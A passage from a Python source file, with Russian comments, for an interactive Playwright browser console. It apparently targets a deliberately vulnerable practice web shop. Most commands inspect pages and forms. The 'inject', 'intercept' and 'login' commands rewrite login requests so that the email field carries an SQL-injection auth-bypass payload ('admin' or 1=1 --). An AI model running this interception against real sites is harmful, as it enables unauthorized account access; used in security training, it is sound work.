        notes='Ожидание 2 секунды'
    )
    async def cmd_wait(self, args):
        """Ожидание"""
        if not args:
            print("❌ Укажите время в мс: wait <мс>")
            return
        
        try:
            ms = int(args[0])
            print(f"⏳ Ожидание {ms}мс...")
            await page.wait_for_timeout(ms)
            print(f"✅ Ожидание завершено")
        except ValueError:
            print("❌ Укажите число миллисекунд")

    @Command(
        name='waitfor', 
        aliases=['waitselector'], 
        description='Ожидание появления элемента',
        usage='waitfor <селектор> [таймаут_мс]',
        example='waitfor "#email" 5000',
        notes='По умолчанию таймаут 30 секунд'
    )
    async def cmd_waitfor(self, args):
        """Ожидание элемента"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите селектор: waitfor <селектор>")
            return
        
        selector = args[0]
        timeout = int(args[1]) if len(args) > 1 else 30000
        
        try:
            await page.wait_for_selector(selector, timeout=timeout)
            print(f"✅ Элемент '{selector}' найден")
        except Exception as e:
            print(f"❌ Элемент не найден: {e}")

    @Command(
        name='text', 
        aliases=['gettext', 'innertext'], 
        description='Получить текст элемента',
        usage='text [селектор]',
        example='text body\ntext "#email"',
        notes='Если селектор не указан, выводит весь текст страницы'
    )
    async def cmd_text(self, args):
        """Получить текст"""
        if not self._check_browser():
            return
        
        selector = args[0] if args else "body"
        
        try:
            text = await page.locator(selector).inner_text()
            print(f"📄 Текст элемента '{selector}':")
            print("-" * 40)
            print(text[:500] + "..." if len(text) > 500 else text)
            print("-" * 40)
        except Exception as e:
            print(f"❌ Ошибка получения текста: {e}")

    @Command(
        name='html', 
        aliases=['source'], 
        description='Получить HTML страницы или элемента',
        usage='html [селектор]',
        example='html\nhtml "body"',
        notes='Если селектор не указан, выводит HTML всей страницы'
    )
    async def cmd_html(self, args):
        """Получить HTML"""
        if not self._check_browser():
            return
        
        selector = args[0] if args else "body"
        
        try:
            if selector == "body":
                html = await page.inner_html("body")
            else:
                html = await page.locator(selector).inner_html()
            
            print(f"📄 HTML элемента '{selector}':")
            print("-" * 40)
            print(html[:500] + "..." if len(html) > 500 else html)
            print("-" * 40)
            print(f"Всего символов: {len(html)}")
        except Exception as e:
            print(f"❌ Ошибка получения HTML: {e}")

    @Command(
        name='inject', 
        aliases=['sqli'], 
        description='Установить SQL-инъекцию для перехвата',
        usage='inject <payload>',
        example='inject "admin\' or 1=1 --"',
        notes='Устанавливает глобальный payload для перехвата'
    )
    async def cmd_inject(self, args):
        """Установка SQL-инъекции"""
        global SQLI_PAYLOAD
        
        if args:
            SQLI_PAYLOAD = args[0]
        print(f"🔧 Payload установлен: {SQLI_PAYLOAD}")

    @Command(
        name='intercept', 
        aliases=['route'], 
        description='Настроить перехват запросов логина',
        usage='intercept',
        example='intercept',
        notes='Перехватывает POST /rest/user/login и заменяет email на payload'
    )
    async def cmd_intercept(self, args):
        """Настройка перехвата запросов"""
        if not self._check_browser():
            return
        
        async def handle_login_route(route, request):
            """Перехват и модификация запроса на логин"""
            if request.method == "POST" and "/rest/user/login" in request.url:
                print(f"🎯 Перехвачен запрос: {request.url}")

                try:
                    original = request.post_data_json or {}
                    print(f"📦 Оригинал: email='{original.get('email')}'")
                except:
                    original = {}

                # Модифицируем email на SQL-инъекцию
                modified = {**original, "email": SQLI_PAYLOAD}
                print(f"🔧 Отправляем: email='{modified['email']}'")

                # Отправляем модифицированный запрос
                await route.continue_(
                    post_data=json.dumps(modified),
                    headers={**request.headers, "Content-Type": "application/json"}
                )
            else:
                await route.continue_()

        async def on_response_handler(response):
            """Обработчик ответов"""
            global login_response_data
            if "/rest/user/login" in response.url and response.request.method == "POST":
                print(f"📡 Получен ответ: статус {response.status}")
                try:
                    body = await response.text()
                    login_response_data = {
                        "status": response.status,
                        "body": body,
                        "json": json.loads(body) if body.strip().startswith("{") else None
                    }
                    print(f"✅ Ответ сохранен")
                    if login_response_data["json"]:
                        print(f"📦 Данные: {login_response_data['json']}")
                except Exception as e:
                    print(f"⚠️ Ошибка чтения ответа: {e}")

        # Регистрируем обработчики
        await page.route("**/*", handle_login_route)
        page.on("response", on_response_handler)
        
        print("✅ Перехватчик настроен корректно")
        print(f"🔧 Используется payload: {SQLI_PAYLOAD}")

    @Command(
        name='login', 
        aliases=['auth'], 
        description='Автоматический вход с SQL-инъекцией',
        usage='login',
        example='login',
        notes='Заполняет форму и отправляет с перехваченной инъекцией'
    )
    async def cmd_login(self, args):
        """Автоматический вход с SQL-инъекцией"""
        if not self._check_browser():
            return
        
        print("🔐 Выполнение автоматического входа...")
        
        try:
            # Ждем форму
            await page.wait_for_selector("#email", timeout=10000)
            
            # Заполняем поля
            await page.fill("#email", "admin")
            await page.fill("#password", "x")
            print("✅ Поля заполнены")
            
            # Ждем активации кнопки
            await page.wait_for_function(
                "document.querySelector('#loginButton')?.disabled === false",
                timeout=10000
            )
            
            # Кликаем кнопку
            await page.click("#loginButton", timeout=10000)
            print("✅ Кнопка нажата, запрос отправлен")
            
            # Ждем ответ
            await page.wait_for_timeout(2000)
        except Exception as e:
            print(f"❌ Ошибка входа: {e}")

    @Command(
        name='cookie', 
        aliases=['dismiss'], 
        description='Закрыть cookie-баннер',
        usage='cookie',
        example='cookie',
        notes='Пробует несколько селекторов для закрытия'
    )
    async def cmd_cookie(self, args):
        """Закрытие cookie-баннера"""
        if not self._check_browser():
            return
        
        print("🔍 Поиск cookie-баннера...")
        
        dismiss_selectors = [
            ".cc-btn.cc-dismiss",
            "a[aria-label='dismiss cookie message']",
            "button:has-text('Me want it!')",
            ".cc-dismiss"
        ]
        
        clicked = False
        
        for selector in dismiss_selectors:
            try:
                btn = page.locator(selector).first
                if await btn.is_visible(timeout=2000):
                    await btn.click(timeout=5000)
                    print(f"✅ Клик по селектору '{selector}' успешен")
                    clicked = True
                    break
            except:
                continue
        
        if not clicked:
            print("ℹ️ Cookie-баннер не найден или уже закрыт")
        
        await page.wait_for_timeout(500)

    @Command(
        name='account', 
        aliases=['menu'], 
        description='Кликнуть по кнопке Account',
        usage='account',
        example='account',
        notes='Пробует несколько селекторов, включая JS-клик'
    )
    async def cmd_account(self, args):
        """Клик по кнопке Account"""
        if not self._check_browser():
            return
        
        print("🔍 Поиск кнопки Account...")
        
        account_selectors = [
            "#navbarAccount",
            'button[aria-label="Show/hide account menu"]',
            'button:has-text("Account")',
            'mat-icon:has-text("account_circle")'
        ]
        
        clicked = False
        
        for selector in account_selectors:
            try:
                btn = page.locator(selector).first
                if await btn.is_visible(timeout=3000):
                    await btn.wait_for(state="visible", timeout=3000)
                    await btn.click(timeout=10000)
                    print(f"✅ Клик по '{selector}' успешен")
                    clicked = True
                    break
            except Exception as e:
                print(f"⚠️ Селектор '{selector}': {e}")
                continue
        
        if not clicked:
            print("🔄 Пробуем клик через JavaScript...")
            await page.evaluate("""
                const btn = document.querySelector('#navbarAccount') ||
                           document.querySelector('[aria-label="Show/hide account menu"]');
                if (btn) {
                    btn.click();
                }
            """)
            print("✅ JS-клик выполнен")
        
        await page.wait_for_timeout(1000)

    @Command(
        name='analyze', 
        aliases=['inspect'], 
        description='Проанализировать элемент',
        usage='analyze <селектор>',
        example='analyze "button:has-text("EN")"',
        notes='Показывает подробную информацию об элементе'
    )
    async def cmd_analyze(self, args):
        """Анализ элемента"""
        if not self._check_browser():
            return
        
        if not args:
            print("❌ Укажите селектор: analyze <селектор>")
            return
        
        selector = args[0]
        
        async def analyze_element(page, selector):
            """Полная диагностика элемента"""
            el = page.locator(selector).first
            
            try:
                count = await el.count()
                if count == 0:
                    return {"error": "Элемент не найден"}
                
                info = await el.evaluate("""
                    el => {
                        const style = window.getComputedStyle(el);
                        return {
                            tag: el.tagName.toLowerCase(),
                            id: el.id,
                            class: el.className,
                            text: el.innerText.trim().substring(0, 100),
                            role: el.getAttribute('role'),
                            type: el.getAttribute('type'),
                            is_button: el instanceof HTMLButtonElement,
                            is_link: el.tagName === 'A',
                            is_input: el instanceof HTMLInputElement,
                            is_interactive: ['BUTTON', 'A', 'INPUT', 'SELECT'].includes(el.tagName),
                            cursor: style.cursor,
                            display: style.display,
                            disabled: el.disabled || el.hasAttribute('disabled') || false,
                            visible: el.offsetParent !== null,
                            width: el.offsetWidth,
                            height: el.offsetHeight
                        };
                    }
                """)
                
                if info.get("is_button") or info.get("role") == "button" or info.get("type") == "submit":
                    info["element_type"] = "BUTTON"
                elif info.get("is_link"):
                    info["element_type"] = "LINK"
                elif info.get("is_input"):
                    info["element_type"] = "INPUT"
                else:
                    info["element_type"] = "TEXT"
                
                return info
                
            except Exception as e:
                return {"error": str(e)}
        
        result = await analyze_element(page, selector)
        
        if result.get("error"):
            print(f"❌ Ошибка: {result['error']}")
        else:
            print("\n" + "="*50)
            print(f"АНАЛИЗ ЭЛЕМЕНТА: {selector}")
            print("="*50)
            print(f"Тип: {result.get('element_type', 'UNKNOWN')}")
            print(f"Тег: {result.get('tag', '')}")
            print(f"ID: {result.get('id', '')}")
            print(f"Класс: {result.get('class', '')}")
            print(f"Текст: {result.get('text', '')}")
            print(f"Роль: {result.get('role', '')}")
            print(f"Type: {result.get('type', '')}")
            print(f"Видим: {result.get('visible', False)}")
            print(f"Размер: {result.get('width', 0)}x{result.get('height', 0)}")
            print(f"Интерактивен: {result.get('is_interactive', False)}")
            print(f"Отключен: {result.get('disabled', False)}")
            print(f"Cursor: {result.get('cursor', '')}")
            print("="*50)

    @Command(
        name='status', 
        aliases=['info'], 
        description='Показать статус браузера и переменные',
        usage='status',
        example='status',
        notes='Показывает информацию о текущем состоянии'
    )
    async def cmd_status(self, args):
        """Статус браузера"""
        global TARGET_URL, SQLI_PAYLOAD, login_response_data
        
        print("\n" + "="*50)
        print("СТАТУС")
        print("="*50)
        
        if browser and page:
            print("✅ Браузер: ЗАПУЩЕН")
            try:
                url = page.url
                print(f"📌 Текущий URL: {url}")
            except:
                print("📌 Текущий URL: неизвестно")
        else:
            print("❌ Браузер: НЕ ЗАПУЩЕН")
        
        print(f"🌐 TARGET_URL: {TARGET_URL}")
        print(f"🔧 SQLI_PAYLOAD: {SQLI_PAYLOAD}")
        
        if login_response_data:
            print(f"📦 Последний ответ логина: статус {login_response_data.get('status')}")
        
        print("="*50)

    @Command(
        name='runscript', 
        aliases=['script', 'source'], 
        description='Выполнить команды из файла',
        usage='runscript <файл>',
        example='runscript commands.txt',
        notes='Каждая команда с новой строки'
    )
    def cmd_runscript(self, args):
        """Выполнить скрипт из файла"""
        if not args:
            print("❌ Укажите файл: runscript <файл>")
            return
        
        filename = args[0]
        
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                commands = f.readlines()
            
            print(f"📄 Выполнение скрипта из {filename}...")
            
            for line_num, cmd_line in enumerate(commands, 1):
                cmd_line = cmd_line.strip()
                if not cmd_line or cmd_line.startswith('#'):
                    continue
                
                print(f"\n[{line_num}] {self.prompt}{cmd_line}")
                command, args = self.parse_input(cmd_line)
                
                if command:
                    self.execute(command, args)
                
                # Небольшая пауза между командами
                if asyncio.iscoroutinefunction(self.commands.get(command, lambda: None)):
                    # Для асинхронных команд делаем паузу
                    if self.loop and not self.loop.is_closed():
                        self.loop.run_until_complete(asyncio.sleep(0.5))
            
            print(f"\n✅ Скрипт {filename} выполнен")
            
        except FileNotFoundError:
            print(f"❌ Файл {filename} не найден")
        except Exception as e:
            print(f"❌ Ошибка выполнения скрипта: {e}")

    @Command(
        name='tree', 
        aliases=['dom', 'structure'], 
        description='Показать DOM-дерево страницы',
        usage='tree [селектор] [--depth N] [--text]',
        example='tree\ntree body --depth 3\ntree "#main" --text',
        notes='Использует --depth для ограничения глубины, --text для показа текста'
    )
    async def cmd_tree(self, args):
        """Показать структуру DOM в виде дерева"""
        if not self._check_browser():
            return
        
        # Парсинг аргументов
        selector = "body"
        max_depth = 4
        show_text = False
        
        i = 0
        while i < len(args):
            if args[i] == '--depth' and i + 1 < len(args):
                try:
                    max_depth = int(args[i + 1])
                    i += 2
                    continue
                except ValueError:
                    pass
            elif args[i] == '--text' or args[i] == '-t':
                show_text = True
                i += 1
                continue
            elif not args[i].startswith('--'):
                selector = args[i]
                i += 1
                continue
            i += 1
        
        print(f"🌳 Построение дерева для '{selector}' (глубина: {max_depth})...\n")
        
        # JavaScript для извлечения упрощённого DOM-дерева
        tree_data = await page.evaluate("""
            (params) => {
                const { selector, maxDepth, showText } = params;
                
                // Элементы, которые стоит пропустить
                const SKIP_TAGS = new Set([
                    'script', 'style', 'meta', 'link', 'noscript', 
                    'svg', 'path', 'circle', 'rect', 'defs', 'g'
                ]);
                
                // Атрибуты, которые стоит сохранить
                const KEEP_ATTRS = [
                    'id', 'class', 'name', 'type', 'value', 'href', 
                    'src', 'alt', 'title', 'role', 'aria-label',
                    'placeholder', 'for', 'data-testid', 'data-cy'
                ];
                
                // Интерактивные теги
                const INTERACTIVE = new Set([
                    'a', 'button', 'input', 'select', 'textarea', 
                    'form', 'label', 'option', 'summary', 'details'
                ]);
                
                function isVisible(el) {
                    if (!el) return false;
                    const style = window.getComputedStyle(el);
                    return style.display !== 'none' && 
                        style.visibility !== 'hidden' && 
                        style.opacity !== '0';
                }
                
                function hasSignificantText(el) {
                    const text = el.textContent?.trim();
                    return text && text.length > 0 && text.length < 200;
                }
                
                function buildTree(node, depth) {
                    if (depth > maxDepth) return null;
                    if (!(node instanceof Element)) return null;
                    
                    const tag = node.tagName.toLowerCase();
                    if (SKIP_TAGS.has(tag)) return null;
                    
                    const result = {
                        tag: tag,
                        attrs: {},
                        text: null,
                        children: [],
                        interactive: INTERACTIVE.has(tag),
                        visible: isVisible(node)
                    };
                    
                    // Сохраняем важные атрибуты
                    for (const attr of KEEP_ATTRS) {
                        const val = node.getAttribute(attr);
                        if (val && val.trim()) {
                            result.attrs[attr] = val.length > 50 ? val.slice(0, 47) + '...' : val;
                        }
                    }
                    
                    // Добавляем классы и ID отдельно для удобства
                    if (node.id) result.attrs['#id'] = node.id;
                    if (node.className && typeof node.className === 'string') {
                        const classes = node.className.trim().split(/\s+/).filter(c => c);
                        if (classes.length) result.attrs['.class'] = classes.slice(0, 3).join('.');
                    }
                    
                    // Текстовое содержимое (только если есть прямой текст)
                    if (showText && hasSignificantText(node)) {
                        let directText = '';
                        for (const child of node.childNodes) {
                            if (child.nodeType === 3) {
                                directText += child.textContent.trim();
                            }
                        }
                        if (directText) {
                            result.text = directText.length > 60 ? directText.slice(0, 57) + '...' : directText;
                        }
                    }
                    
                    // Рекурсивно обрабатываем детей
                    for (const child of node.children) {
                        const childTree = buildTree(child, depth + 1);
                        if (childTree) {
                            result.children.push(childTree);
                        }
                    }
                    
                    return result;
                }
                
                const root = document.querySelector(selector);
                if (!root) return { error: `Элемент '${selector}' не найден` };
                
                return buildTree(root, 0);
            }
        """, {"selector": selector, "maxDepth": max_depth, "showText": show_text})  # ← Один dict вместо 3 аргументов
        
        # Обработка ошибок
        if tree_data.get('error'):
            print(f"❌ {tree_data['error']}")
            return
        
        # Вывод дерева
        self._print_tree(tree_data, prefix="", is_last=True, show_text=show_text)
        print(f"\n💡 Подсказка: используйте 'tree --depth N' для контроля глубины")

    @Command(
        name='forms', 
        aliases=['form', 'login'], 
        description='Показать все формы с полями и кнопками',
        usage='forms',
        example='forms',
        notes='Показывает structure всех форм на странице'
    )
    async def cmd_forms(self, args):
        """Показать все формы с инпутами и кнопками"""
        if not self._check_browser():
            return
        
        print("📋 Поиск всех форм на странице...\n")
        
        forms_data = await page.evaluate("""
            () => {
                const forms = document.querySelectorAll('form');
                const result = [];
                
                for (const form of forms) {
                    const formInfo = {
                        id: form.id || null,
                        class: form.className?.split(' ').slice(0, 3).join('.') || null,
                        action: form.action || null,
                        method: form.method?.toUpperCase() || 'GET',
                        fields: [],
                        buttons: []
                    };
                    
                    // Все инпуты, селекты, текстареа
                    const inputs = form.querySelectorAll('input, select, textarea, label');
                    for (const input of inputs) {
                        const type = input.tagName === 'INPUT' ? (input.type || 'text') : input.tagName.toLowerCase();
                        const fieldInfo = {
                            tag: input.tagName.toLowerCase(),
                            type: type,
                            id: input.id || null,
                            name: input.name || null,
                            placeholder: input.placeholder || null,
                            value: input.value?.slice(0, 30) || null,
                            required: input.required || false,
                            disabled: input.disabled || false,
                            label: null
                        };
                        
                        // Ищем связанный label
                        if (input.id) {
                            const label = document.querySelector(`label[for="${input.id}"]`);
                            if (label) fieldInfo.label = label.textContent.trim().slice(0, 40);
                        }
                        
                        formInfo.fields.push(fieldInfo);
                    }
                    
                    // Все кнопки в форме
                    const buttons = form.querySelectorAll('button, input[type="submit"], input[type="button"]');
                    for (const btn of buttons) {
                        formInfo.buttons.push({
                            tag: btn.tagName.toLowerCase(),
                            type: btn.type || 'button',
                            id: btn.id || null,
                            text: btn.textContent.trim().slice(0, 30) || btn.value?.slice(0, 30) || null,
                            disabled: btn.disabled || false
                        });
                    }
                    
                    result.push(formInfo);
                }
                
                // Если форм нет, ищем инпуты вне форм
                if (result.length === 0) {
                    const orphanInputs = document.querySelectorAll('input, select, textarea');
                    if (orphanInputs.length > 0) {
                        result.push({
                            id: null,
                            class: null,
                            action: null,
                            method: null,
                            fields: Array.from(orphanInputs).map(inp => ({
                                tag: inp.tagName.toLowerCase(),
                                type: inp.type || inp.tagName.toLowerCase(),
                                id: inp.id || null,
                                name: inp.name || null,
                                placeholder: inp.placeholder || null,
                                label: null
                            })),
                            buttons: [],
                            note: 'Поля вне форм'
                        });
                    }
                }
                
                return result.length > 0 ? result : { error: 'Формы не найдены' };
            }
        """)
        
        if isinstance(forms_data, dict) and forms_data.get('error'):
            print(f"❌ {forms_data['error']}")
            return
        
        for i, form in enumerate(forms_data, 1):
            print(f"\n{'='*60}")
            print(f"📄 ФОРМА #{i}")
            print(f"{'='*60}")
            
            if form.get('note'):
                print(f"⚠️ {form['note']}")
            
            if form.get('id'):
                print(f"🏷️  ID: #{form['id']}")
            if form.get('class'):
                print(f"🎨 Класс: .{form['class']}")
            if form.get('action'):
                print(f"🔗 Action: {form['action'][:60]}{'...' if len(form['action']) > 60 else ''}")
            if form.get('method'):
                print(f"📮 Method: {form['method']}")
            
            if form.get('fields'):
                print(f"\n📝 ПОЛЯ ({len(form['fields'])}):")
                for field in form['fields']:
                    req = "🔴" if field.get('required') else "  "
                    dis = "🚫" if field.get('disabled') else "  "
                    label = f" ← {field['label']}" if field.get('label') else ""
                    
                    field_str = f"  {req}{dis}<{field['tag']} type={field['type']}"
                    if field.get('id'):
                        field_str += f" #{field['id']}"
                    if field.get('name'):
                        field_str += f" [name={field['name']}]"
                    if field.get('placeholder'):
                        field_str += f" placeholder=\"{field['placeholder'][:30]}\""
                    field_str += f">{label}"
                    print(field_str)
            
            if form.get('buttons'):
                print(f"\n🔘 КНОПКИ ({len(form['buttons'])}):")
                for btn in form['buttons']:
                    dis = "🚫" if btn.get('disabled') else "  "
                    text = f" \"{btn['text']}\"" if btn.get('text') else ""
                    print(f"  {dis}<{btn['tag']} type={btn['type']}>{text}")
        
        print(f"\n{'='*60}")
        if forms_data:
            print(f"✅ Всего найдено форм: {len(forms_data)}")
        print(f"{'='*60}")

    @Command(
        name='inputs', 
        aliases=['fields', 'interactive'], 
        description='Показать все инпуты и кнопки на странице',
        usage='inputs [--type TYPE]',
        example='inputs\ninputs --type button\ninputs --type email',
        notes='Можно фильтровать по типу элемента'
    )
    async def cmd_inputs(self, args):
        """Показать все интерактивные элементы"""
        if not self._check_browser():
            return
        
        # Парсинг аргументов
        filter_type = None
        for i, arg in enumerate(args):
            if arg == '--type' and i + 1 < len(args):
                filter_type = args[i + 1].lower()
        
        print("🔍 Поиск интерактивных элементов...\n")
        
        elements = await page.evaluate("""
            (filterType) => {
                const allElements = document.querySelectorAll('input, button, select, textarea, a[role="button"]');
                const result = { inputs: [], buttons: [], selects: [], links: [] };
                
                for (const el of allElements) {
                    const isVisible = () => {
                        const style = window.getComputedStyle(el);
                        return style.display !== 'none' && 
                            style.visibility !== 'hidden' && 
                            style.opacity !== '0' &&
                            el.offsetParent !== null;
                    };
                    
                    if (!isVisible()) continue;
                    
                    const info = {
                        tag: el.tagName.toLowerCase(),
                        type: el.type || el.tagName.toLowerCase(),
                        id: el.id || null,
                        name: el.name || null,
                        class: el.className?.split(' ').slice(0, 2).join('.') || null,
                        text: el.textContent?.trim().slice(0, 40) || el.value?.slice(0, 40) || el.placeholder?.slice(0, 40) || null,
                        placeholder: el.placeholder || null,
                        required: el.required || false,
                        disabled: el.disabled || false,
                        href: el.href || null,
                        visible: true
                    };
                    
                    // Фильтрация по типу
                    if (filterType && info.type.toLowerCase() !== filterType.toLowerCase()) {
                        continue;
                    }
                    
                    if (el.tagName === 'INPUT') {
                        result.inputs.push(info);
                    } else if (el.tagName === 'BUTTON' || el.getAttribute('role') === 'button') {
                        result.buttons.push(info);
                    } else if (el.tagName === 'SELECT') {
                        result.selects.push(info);
                    } else if (el.tagName === 'TEXTAREA') {
                        result.inputs.push(info);
                    }
                }
                
                return result;
            }
        """, filter_type)
        
        # Вывод инпутов
        if elements['inputs']:
            print(f"📝 ПОЛЯ ВВОДА ({len(elements['inputs'])}):")
            print("-" * 70)
            for i, inp in enumerate(elements['inputs'], 1):
                req = "🔴" if inp.get('required') else "  "
                dis = "🚫" if inp.get('disabled') else "  "
                vis = "👁️" if inp.get('visible') else "  "
                
                id_str = f"#{inp['id']}" if inp.get('id') else ""
                name_str = f"[name={inp['name']}]" if inp.get('name') else ""
                text_str = f" \"{inp['text']}\"" if inp.get('text') else ""
                
                print(f"{i:2}. {vis}{req}{dis} <{inp['tag']} type={inp['type']:8}> {id_str:15} {name_str:20}{text_str}")
            print()
        
        # Вывод кнопок
        if elements['buttons']:
            print(f"🔘 КНОПКИ ({len(elements['buttons'])}):")
            print("-" * 70)
            for i, btn in enumerate(elements['buttons'], 1):
                dis = "🚫" if btn.get('disabled') else "  "
                vis = "👁️" if btn.get('visible') else "  "
                
                id_str = f"#{btn['id']}" if btn.get('id') else ""
                text_str = f" \"{btn['text']}\"" if btn.get('text') else ""
                
                print(f"{i:2}. {vis}{dis} <{btn['tag']}> {id_str:15}{text_str}")
            print()
        
        # Вывод селектов
        if elements['selects']:
            print(f"📋 ВЫПАДАЮЩИЕ СПИСКИ ({len(elements['selects'])}):")
            print("-" * 70)
            for i, sel in enumerate(elements['selects'], 1):
                id_str = f"#{sel['id']}" if sel.get('id') else ""
                name_str = f"[name={sel['name']}]" if sel.get('name') else ""
                
                print(f"{i:2}. <{sel['tag']}> {id_str:15} {name_str}")
            print()
        
        # Итого
        total = len(elements['inputs']) + len(elements['buttons']) + len(elements['selects'])
        print(f"{'='*70}")
        print(f"✅ Всего интерактивных элементов: {total}")
        print(f"{'='*70}")

    @Command(
        name='cards', 
        aliases=['content', 'text'], 
        description='Показать карточки и текстовый контент',
        usage='cards [--min-text N]',
        example='cards\ncards --min-text 50',
        notes='Показывает карточки, статьи и блоки с текстом'
    )
    async def cmd_cards(self, args):
        """Показать карточки и текстовые блоки"""
        if not self._check_browser():
            return
        
        # Парсинг аргументов
        min_text_len = 20
        for i, arg in enumerate(args):
            if arg == '--min-text' and i + 1 < len(args):
                try:
                    min_text_len = int(args[i + 1])
                except ValueError:
                    pass
        
        print(f"📄 Поиск карточек и текста (мин. длина: {min_text_len})...\n")
        
        cards_data = await page.evaluate("""
            (minTextLen) => {
                // Селекторы для карточек
                const cardSelectors = [
                    '.card', '.mat-card', '.ant-card', '.card-body',
                    '[class*="card"]', '[class*="tile"]', '[class*="item"]',
                    'article', 'section', '.product', '.item-box'
                ];
                
                const cards = [];
                const seen = new Set();
                
                for (const selector of cardSelectors) {
                    const elements = document.querySelectorAll(selector);
                    for (const el of elements) {
                        const id = el.id || el.className || '';
                        if (seen.has(id)) continue;
                        seen.add(id);
                        
                        const text = el.textContent?.trim().replace(/\s+/g, ' ') || '';
                        if (text.length < minTextLen) continue;
                        
                        const isVisible = () => {
                            const style = window.getComputedStyle(el);
                            return style.display !== 'none' && 
                                style.visibility !== 'hidden' &&
                                el.offsetParent !== null;
                        };
                        
                        cards.push({
                            tag: el.tagName.toLowerCase(),
                            id: el.id || null,
                            class: el.className?.split(' ').slice(0, 3).join('.') || null,
                            text: text.slice(0, 200),
                            textLength: text.length,
                            visible: isVisible(),
                            hasImage: el.querySelector('img') !== null,
                            hasButton: el.querySelector('button, a') !== null,
                            children: el.children.length
                        });
                    }
                }
                
                // Сортировка по длине текста
                cards.sort((a, b) => b.textLength - a.textLength);
                
                return cards.length > 0 ? cards : { error: 'Карточки не найдены' };
            }
        """, min_text_len)
        
        if isinstance(cards_data, dict) and cards_data.get('error'):
            print(f"❌ {cards_data['error']}")
            return
        
        for i, card in enumerate(cards_data, 1):
            vis = "👁️" if card.get('visible') else "👁️‍🗨️"
            img = "🖼️" if card.get('hasImage') else "  "
            btn = "🔘" if card.get('hasButton') else "  "
            
            print(f"\n{'='*70}")
            print(f"📦 КАРТОЧКА #{i} {vis}{img}{btn}")
            print(f"{'='*70}")
            
            if card.get('id'):
                print(f"🏷️  ID: #{card['id']}")
            if card.get('class'):
                print(f"🎨 Класс: .{card['class']}")
            
            print(f"📏 Размер текста: {card['textLength']} симв.")
            print(f"👶 Дочерних элементов: {card['children']}")
            
            print(f"\n📝 ТЕКСТ:")
            print("-" * 70)
            # Выводим текст с переносами
            text = card['text']
            wrapped = []
            for j in range(0, len(text), 70):
                wrapped.append(text[j:j+70])
            print('\n'.join(wrapped))
            print("-" * 70)
        
        print(f"\n{'='*70}")
        if cards_data:
            print(f"✅ Всего найдено карточек: {len(cards_data)}")
        print(f"{'='*70}")

    @Command(
        name='viewport', 
        aliases=['vsize', 'resize'], 
        description='Установить размер окна браузера',
        usage='viewport <width> <height>',
        example='viewport 1920 1080\nviewport 2560 1440\nviewport 3840 2160',
        notes='По умолчанию 1920x1080. Для полного сайта используйте большие значения'
    )
    async def cmd_viewport(self, args):
        """Установить размер viewport"""
        if not self._check_browser():
            return
        
        # Значения по умолчанию для полного отображения
        width = 1920
        height = 1080
        
        if len(args) >= 2:
            try:
                width = int(args[0])
                height = int(args[1])
            except ValueError:
                print("❌ Укажите числа: viewport 1920 1080")
                return
        elif len(args) == 1 and args[0] == 'full':
            # Режим "полный сайт"
            width = 3840
            height = 2160
        
        print(f"📐 Установка viewport: {width}x{height}...")
        
        await page.set_viewport_size({"width": width, "height": height})
        
        # Подтверждение
        actual = page.viewport_size
        print(f"✅ Viewport установлен: {actual['width']}x{actual['height']}")
        
        if width >= 2560:
            print("💡 Большой viewport включён — все элементы должны быть видны")

    @Command(
        name='fitpage', 
        aliases=['fit', 'autoscale'], 
        description='Автоматически подогнать страницу под размер окна',
        usage='fitpage',
        example='fitpage',
        notes='Вычисляет оптимальный масштаб для отображения всей страницы'
    )
    async def cmd_fitpage(self, args):
        """Автоматическая подгонка страницы под viewport"""
        if not self._check_browser():
            return
        
        print("📐 Вычисление оптимального масштаба...")
        
        # Получаем полную высоту страницы
        page_height = await page.evaluate("""
            () => Math.max(
                document.body.scrollHeight,
                document.body.offsetHeight,
                document.documentElement.scrollHeight,
                document.documentElement.offsetHeight
            )
        """)
        
        # Получаем высоту viewport
        viewport = page.viewport_size
        viewport_height = viewport['height'] if viewport else 1080
        
        # Вычисляем масштаб
        if page_height > viewport_height:
            scale = int((viewport_height / page_height) * 100)
            scale = max(10, min(scale, 100))  # Ограничиваем 10-100%
        else:
            scale = 100
        
        print(f"📏 Высота страницы: {page_height}px")
        print(f"📏 Высота viewport: {viewport_height}px")
        print(f"🔍 Оптимальный масштаб: {scale}%")
        
        # Применяем масштаб
        await page.evaluate(f"""
            () => {{
                const scale = {scale / 100};
                document.body.style.transformOrigin = 'top left';
                document.body.style.transform = `scale(${{scale}})`;
                document.body.style.width = `${{1 / scale * 100}}%`;
                document.body.style.height = `${{1 / scale * 100}}%`;
                document.body.style.overflow = 'visible';
                document.documentElement.style.overflow = 'visible';
            }}
        """)
        
        print(f"✅ Страница подогнана под экран (zoom: {scale}%)")

    @Command(
        name='zoomout', 
        aliases=['zoom', 'scale'], 
        description='Уменьшить масштаб страницы (zoom out)',
        usage='zoomout [процент]',
        example='zoomout 50\nzoomout 25\nzoomout reset',
        notes='50% = 2x уменьшение, 25% = 4x уменьшение'
    )
    async def cmd_zoomout(self, args):
        """Уменьшить масштаб страницы через CSS"""
        if not self._check_browser():
            return
        
        scale = 50  # по умолчанию 50%
        
        if args:
            if args[0].lower() == 'reset':
                scale = 100
            else:
                try:
                    scale = int(args[0])
                    if scale < 10 or scale > 100:
                        print("⚠️ Рекомендуемый диапазон: 10-100%")
                except ValueError:
                    print("❌ Укажите число: zoomout 50")
                    return
        
        print(f"🔍 Масштаб: {scale}%...")
        
        await page.evaluate(f"""
            () => {{
                // Применяем transform scale к body
                document.body.style.transformOrigin = 'top left';
                document.body.style.transform = 'scale({scale / 100})';
                document.body.style.width = '{100 / scale * 100}%';
                document.body.style.height = '{100 / scale * 100}%';
                
                // Альтернативно через zoom (работает не во всех браузерах)
                document.documentElement.style.zoom = '{scale / 100}';
                
                // Убираем прокрутку
                document.body.style.overflow = 'visible';
                document.documentElement.style.overflow = 'visible';
            }}
        """)
        
        print(f"✅ Масштаб установлен в {scale}%")
        
        if scale < 50:
            print("💡 Текст может быть мелким — используйте screenshot для деталей")

    @Command(
        name='viewall', 
        aliases=['viewfull', 'showall'], 
        description='Показать всю страницу без масштабирования (безопасно)',
        usage='viewall',
        example='viewall',
        notes='Увеличивает viewport и отключает прокрутку — элементы не ломаются'
    )
    async def cmd_viewall(self, args):
        """Безопасный просмотр всей страницы"""
        if not self._check_browser():
            return
        
        print("🌐 Настройка полного обзора (без масштабирования)...\n")
        
        # 1. Получаем полную высоту страницы
        page_height = await page.evaluate("""
            () => Math.max(
                document.body.scrollHeight,
                document.body.offsetHeight,
